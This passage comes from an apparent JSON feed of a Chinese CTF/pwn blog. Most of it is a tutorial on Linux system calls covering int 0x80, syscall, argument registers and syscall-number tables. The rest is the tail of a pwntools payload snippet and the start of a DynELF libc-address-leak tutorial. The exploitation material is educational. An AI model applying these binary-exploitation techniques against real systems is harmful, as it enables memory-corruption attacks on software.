')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #\n</code></pre>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "url": "https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/",
            "title": "Linux之系统调用",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"一系统调用\"><a class=\"anchor\" href=\"#一系统调用\">#</a> 一。系统调用</h1>\n<p>系统调用也是一个函数，但是系统调用运行在内核态，用户自定义的函数在用户态。而我们想要调用在内核态的指令（如关闭 / 打开中断，I/O 操作等），就需要利用系统调用作为接口，让用户进入内核态。</p>\n<p>系统调用是 Linux 内核提供的一段代码（也可以理解为函数）用来实现特定的功能，**32 位程序（x86 CPU）利用 int 0x80 ** 来进行系统调用，<strong>64 位程序 (X64 CPU) 提供调用 syscall</strong> 来进行系统调用。Linux 内核提供用户空间程序与内核空间进行交互的接口（接口让用户态程序能受限访问硬件设备，比如申请系统资源，操作设备读写，创建新进程等），用户空间发起请求，内核空间负责进行执行，两者之间就需要接口作为桥梁，用户可以通过这种方式来进行系统调用，但是用户是受到限制的，不能直接执行内核代码，也不能随意进行修改系统，必须通过特定方式才能进行才能进入内核，也需要一定的权限才能使用接口。</p>\n<p>上述提到的用户空间与内核空间之间的桥梁就是系统调用 (syscall,system call), 其作为中间层用来连接用户态和内核态，这样做加强了一定的安全性，并且我们不需要关系内核是如和完成指令的直接调用需要的接口即可。当用户空间向系统空间发起系统调用时，Linux 系统便会进行软中断，进入内核态执行相应的操作。</p>\n<p>不同的系统调用执行的命令有着不同的系统调用号（32 位程序与 64 位程序也不尽相同）</p>\n<h1 id=\"二32位程序系统调用\"><a class=\"anchor\" href=\"#二32位程序系统调用\">#</a> 二.<strong>32 位程序</strong>系统调用</h1>\n<h2 id=\"1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\"><a class=\"anchor\" href=\"#1在32位系统x86-cpu中-linux通过了-int-0x80-中断来进入系统调用\">#</a> 1. 在 32 位系统（x86 CPU）中，Linux 通过了 int 0x80 中断来进入系统调用，</h2>\n<pre><code class=\"language-C\">void system_call()\n&#123;\n    ...\n    // 变量 eax 代表 eax 寄存器的值\n    syscall = sys_call_table[eax];\n    eax = syscall();\n    ...\n&#125;\n</code></pre>\n<p>sys_call_table 变量是一个数组（eax 寄存器的值作为其下标），数组的每一个元素代表着一个系统调用的入口（这让我想起了操作系统实验 x_x）, 其 C 代码如下</p>\n<pre><code class=\"language-C\">long sys_call_table[] = &#123;\n   sys_ni_syscall,\n   sys_exit,\n   sys_fork,\n   sys_read,\n   sys_write,\n   sys_open,\n   sys_close,\n   ...\n&#125;;\n</code></pre>\n<h2 id=\"用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\"><a class=\"anchor\" href=\"#用户调用系统调用时通过向eax寄存器写入对应命令的系统调用号这个号就是sys_call_table数组的下标system_call过程获取eax寄存器的值然后通过eax寄存器的值找到要调用的系统入口并调用系统调用完成后会把返回值保存到eax寄存器中\">#</a> 用户调用<strong>系统调用</strong>时，通过向 eax 寄存器写入对应命令的系统调用号，这个号就是 sys_call_table 数组的下标，system_call 过程获取 eax 寄存器的值，然后通过 eax 寄存器的值找到要调用的系统入口并调用，系统调用完成后会把<strong>返回值保存到 eax 寄存器中</strong></h2>\n<h2 id=\"用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\"><a class=\"anchor\" href=\"#用户进行系统调用时在eax寄存器写入对应的系统调用编号而用户态和内核态使用的栈不同系统调用是用户态调用然后进入系统调用后会转变成内核态要经历用户态与内核态的转化所以不能直接使用用户空间的栈来传递参数32位系统用户态内利用栈来传参64位仍然需要寄存器来传参-linux-使用寄存器来传递参数其顺序如下\">#</a> 用户进行系统调用时，在 eax 寄存器写入对应的系统调用编号，而用户态和内核态使用的栈不同，系统调用是用户态调用然后进入系统调用后会转变成内核态，要经历用户态与内核态的转化，所以不能直接使用用户空间的栈来传递参数（32 位系统用户态内利用栈来传参，64 位仍然需要寄存器来传参）。Linux 使用寄存器来传递参数，其顺序如下：</h2>\n<ul>\n<li>第 1 个参数放置在 ebx  寄存器。</li>\n<li>第 2 个参数放置在 ecx  寄存器。</li>\n<li>第 3 个参数放置在 edx  寄存器。</li>\n<li>第 4 个参数放置在 esi   寄存器。</li>\n<li>第 5 个参数放置在 edi   寄存器。</li>\n<li>第 6 个参数放置在 ebp 寄存器。</li>\n</ul>\n<h2 id=\"linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\"><a class=\"anchor\" href=\"#linux进入中断处理时就会将这些寄存器的值保存到内核栈中这样系统调用就能通过内核栈来获取参数\">#</a> Linux 进入中断处理时，就会将这些寄存器的值保存到内核栈中，这样系统调用就能通过内核栈来获取参数。</h2>\n<p>x86 架构系统调用漏洞利用参考: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjQ4NjgyLmh0bQ==\">https://bbs.kanxue.com/thread-248682.htm</span></p>\n<p>参考文章: <span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9jcklycg==\">Linux 下 syscall 系统调用原理及实现</span></p>\n<h1 id=\"三64位系统系统调用\"><a class=\"anchor\" href=\"#三64位系统系统调用\">#</a> 三.<strong>64 位系统</strong>系统调用</h1>\n<h2 id=\"164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\"><a class=\"anchor\" href=\"#164位x64架构系统中linux通过syscall指令来进入系统调用其他原理与x86架构相似这里偷懒不再解释不过64位系统与32位系统寄存器不同这里传参的寄存器也不一样\">#</a> 1.64 位（x64 架构）系统中，Linux 通过<strong> syscall 指令</strong>来进入系统调用，其他原理与 x86 架构相似，这里偷懒不再解释，不过 64 位系统与 32 位系统寄存器不同，这里传参的寄存器也不一样</h2>\n<h2 id=\"传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\"><a class=\"anchor\" href=\"#传参方式-将系统调用号存入rax寄存器中然后从左到右依次将参数传入rdi-rsi-rdx寄存器中\">#</a> 传参方式：将系统调用号存入 rax 寄存器中，然后从左到右依次将参数传入<strong> rdi、rsi、rdx 寄存器</strong>中：</h2>\n<ul>\n<li>第 1 个参数放置在 rdi  寄存器。</li>\n<li>第 2 个参数放置在 rsi  寄存器。</li>\n<li>第 3 个参数放置在 rdx  寄存器。</li>\n<li>第 4 个参数放置在 rcx  寄存器。</li>\n<li>第 5 个参数放置在 r8  寄存器。</li>\n<li>第 6 个参数放置在 r9  寄存器。</li>\n</ul>\n<h2 id=\"系统调用完成后把返回值保存到rax寄存器中\"><a class=\"anchor\" href=\"#系统调用完成后把返回值保存到rax寄存器中\">#</a> 系统调用完成后，把<strong>返回值保存到 rax 寄存器中</strong></h2>\n<h1 id=\"四32位系统与64位系统-对比系统调用不同\"><a class=\"anchor\" href=\"#四32位系统与64位系统-对比系统调用不同\">#</a> 四.32 位系统与 64 位系统 <strong>对比系统调用不同</strong></h1>\n<h2 id=\"1系统调用号不同\"><a class=\"anchor\" href=\"#1系统调用号不同\">#</a> 1. 系统调用号不同</h2>\n<h3 id=\"32位\"><a class=\"anchor\" href=\"#32位\">#</a> 32 位</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_32_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_32_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_restart_syscall 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_exit 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_fork 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_read 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_write 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_open 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_close 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_waitpid 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_creat 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_link 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_unlink 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_execve 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_chdir 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_time 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_mknod 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_chmod 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_lchown 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_break 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_oldstat 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_mount 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_umount 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_setuid 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_getuid 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_stime 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_ptrace 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_oldfstat 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_pause 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_utime 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_stty 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_gtty 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_access 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_nice 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_ftime 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_sync 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_kill 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_rename 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_mkdir 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_rmdir 40</span></pre></td></tr></table></figure><h3 id=\"64位系统\"><a class=\"anchor\" href=\"#64位系统\">#</a> 64 位系统</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#ifndef _ASM_X86_UNISTD_64_H</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#define _ASM_X86_UNISTD_64_H 1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#define __NR_read 0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#define __NR_write 1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#define __NR_open 2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#define __NR_close 3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#define __NR_stat 4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#define __NR_fstat 5</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#define __NR_lstat 6</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#define __NR_poll 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#define __NR_lseek 8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#define __NR_mmap 9</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#define __NR_mprotect 10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#define __NR_munmap 11</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#define __NR_brk 12</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigaction 13</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigprocmask 14</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#define __NR_rt_sigreturn 15</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#define __NR_ioctl 16</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#define __NR_pread64 17</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#define __NR_pwrite64 18</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#define __NR_readv 19</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#define __NR_writev 20</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">#define __NR_access 21</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#define __NR_pipe 22</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">#define __NR_select 23</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#define __NR_sched_yield 24</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#define __NR_mremap 25</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#define __NR_msync 26</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#define __NR_mincore 27</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">#define __NR_madvise 28</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">#define __NR_shmget 29</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#define __NR_shmat 30</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#define __NR_shmctl 31</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#define __NR_dup 32</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">#define __NR_dup2 33</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">#define __NR_pause 34</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">#define __NR_nanosleep 35</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">#define __NR_getitimer 36</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">#define __NR_alarm 37</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token comment\">#define __NR_setitimer 38</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">#define __NR_getpid 39</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#define __NR_sendfile 40</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#define __NR_socket 41</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#define __NR_connect 42</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token comment\">#define __NR_accept 43</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#define __NR_sendto 44</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token comment\">#define __NR_recvfrom 45</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\">#define __NR_sendmsg 46</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#define __NR_recvmsg 47</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">#define __NR_shutdown 48</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\">#define __NR_bind 49</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#define __NR_listen 50</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#define __NR_getsockname 51</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token comment\">#define __NR_getpeername 52</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\">#define __NR_socketpair 53</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token comment\">#define __NR_setsockopt 54</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token comment\">#define __NR_getsockopt 55</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#define __NR_clone 56</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token comment\">#define __NR_fork 57</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\">#define __NR_vfork 58</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#define __NR_execve 59</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#define __NR_exit 60</span></pre></td></tr></table></figure><p>完整系统调用号:<span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==\">http://t.csdn.cn/drsyy</span></p>\n<h2 id=\"2寄存器传参不同上面已经说明过了\"><a class=\"anchor\" href=\"#2寄存器传参不同上面已经说明过了\">#</a> 2. 寄存器传参不同 (上面已经说明过了)</h2>\n<h2 id=\"3进行系统调用方式不同\"><a class=\"anchor\" href=\"#3进行系统调用方式不同\">#</a> 3. 进行系统调用方式不同</h2>\n<p>32 位系统通过 ** int 0x80 ** 中断进入系统调用</p>\n<p>64 位系统通过 ** syscall ** 命令进入系统调用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==\">http://t.csdn.cn/Jz6Hm</span></p>\n<h1 id=\"五-open-write-read-close的系统调用\"><a class=\"anchor\" href=\"#五-open-write-read-close的系统调用\">#</a> 五、open、write、read、close 的系统调用</h1>\n<h2 id=\"1文件描述符\"><a class=\"anchor\" href=\"#1文件描述符\">#</a> 1. 文件描述符</h2>\n<p>每一个进程都有一个与之相关的文件描述符，它们是一些小值整数，我们可以通过这些文件描述符来访问打开的文件</p>\n<p>一般地，一个程序开始运行时，会自动打开 3 个文件描述符：</p>\n<ul>\n<li>0——–标准输入 ———-stdin</li>\n<li>1——–标准输出 ———-stdout</li>\n<li>2——–标准错误 ———-stderr</li>\n</ul>\n<h2 id=\"2write系统调用\"><a class=\"anchor\" href=\"#2write系统调用\">#</a> 2.write 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>write 系统调用，是把缓存区 buf 中的前 nbytes 字节写入到与文件描述符 <code>flides有关</code> 的文件中，write 系统调用返回的是实际写入到文件中的 <code>字节数</code> 。</p>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> #标准输出流（<span class=\"token number\">1</span>），将aaa输出到屏幕上</pre></td></tr></table></figure><h2 id=\"3read系统调用\"><a class=\"anchor\" href=\"#3read系统调用\">#</a> 3.read 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">size_t</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">,</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> nbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>read 系统调用，是从与文件描述符 flides 相关联的文件中读取前 nbytes 字节的内容，并且写入到数据区 buf 中。read 系统调用返回的是实际读入的 <code>字节数</code></p>\n<h2 id=\"4open系统调用\"><a class=\"anchor\" href=\"#4open系统调用\">#</a> 4.open 系统调用</h2>\n<p>两种系统调用方式</p>\n<h3 id=\"第一种\"><a class=\"anchor\" href=\"#第一种\">#</a> 第一种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>将准备打开的文件或是设备的名字作为参数 path 传给函数，oflags 用来指定文件访问模式。open 系统调用成功返回一个新的文件描述符，失败返回 - 1。</p>\n<p>其中，oflags 是由必需文件访问模式和可选模式一起构成的 (通过按位或 “|”)：</p>\n<p>必需部分：</p>\n<ul>\n<li>O_RDONLY------ 以只读方式打开</li>\n<li>O_WRONLY------ 以只写方式打开</li>\n<li>O_RDWR -------- 以读写方式打开</li>\n</ul>\n<p>例如：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> f<span class=\"token operator\">=</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file.c\"</span><span class=\"token punctuation\">,</span>O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以只读方式打开文件</span></pre></td></tr></table></figure><h3 id=\"第二种\"><a class=\"anchor\" href=\"#第二种\">#</a> 第二种</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>path<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> oflags<span class=\"token punctuation\">,</span> <span class=\"token class-name\">mode_t</span> mode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>在第一种调用方式上，加上了第三个参数 mode，主要是搭配 O_CREAT 使用，同样地，这个参数规定了属主、同组和其他人对文件的文件操作权限。</p>\n<h2 id=\"5close系统调用\"><a class=\"anchor\" href=\"#5close系统调用\">#</a> 5.close 系统调用</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> flides<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>终止文件描述符 flides 与其对应的文件间的联系，文件描述符被释放，可重新使用。</p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "url": "https://vvwwvv.cn/2023/08/29/pwn/%E4%B8%93%E6%A0%8F/DynELF/",
            "title": "DynELF",
            "date_published": "2023-08-29T12:15:56.000Z",
            "content_html": "<h1 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h1>\n<p>由于在 pwn 题中有时候不给 libc，那么需要我们自己通过泄露函数地址来获得 libc 的基地址，而往往 LibcSearcher 无法准确的得到 libc 版本，那么我们就需要利用 DynELF，这是 pwntools 在早期版本就提供了一个解决方案 ——DynELF 类；利用方式与 ret2libc 类似，都是泄露函数地址来计算得到 libc 基址，通俗地讲，DynELF 就是通过程序漏洞泄露出任意地址内容，结合 ELF 文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</p>\n<p>并且：<br />\nwrite 函数是最理想的，因为 write 函数的特点在于其输出完全由其参数 size 决定，只要目标地址可读，size 填多少就输出多少，不会受到诸如‘\\0’, ‘\\n’之类的字符影响；而 puts, printf 函数会受到诸如‘\\0’, ‘\\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>\n<h1 id=\"使用方式\"><a class=\"anchor\" href=\"#使用方式\">#</a> 使用方式</h1>\n<p>首先需要构造一个函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span 